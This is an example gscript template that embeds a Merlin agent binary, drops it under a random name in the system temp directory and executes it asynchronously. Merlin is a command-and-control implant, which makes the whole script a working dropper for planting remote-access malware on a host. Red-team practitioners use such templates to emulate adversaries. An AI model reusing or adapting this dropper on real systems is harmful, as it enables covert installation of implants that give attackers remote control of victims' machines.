// Example gscript template
// Title: Merlin Example
// Author: ahhh
// Purpose: Drops merlin as an asset and executes it async
// Gscript version: 1.0.0
// ATT&CK: 

//priority:150
//timeout:150

//import:/private/tmp/merlinagent.elf

//go_import:os as os

function Deploy() {  
    console.log("Starting to drop merlin binary");
    // Getting our asset
    var merlinBin = GetAssetAsBytes("merlinagent.elf");
    console.log("errors: "+Dump(merlinBin[1]));
    // Getting a random string
    var temppath = os.TempDir();
    var naming = G.rand.GetAlphaString(4);
    naming = naming.toLowerCase();
    fullpath = temppath+"/"+naming;
    console.log("file name: "+ fullpath);
    // Write payload
    errors = G.file.WriteFileFromBytes(fullpath, merlinBin[0]);
    console.log("errors: "+Dump(errors));
    // Run payload
    var running = G.exec.ExecuteCommandAsync(fullpath, [""]);
    console.log("errors: "+Dump(running[1]));
    return true
}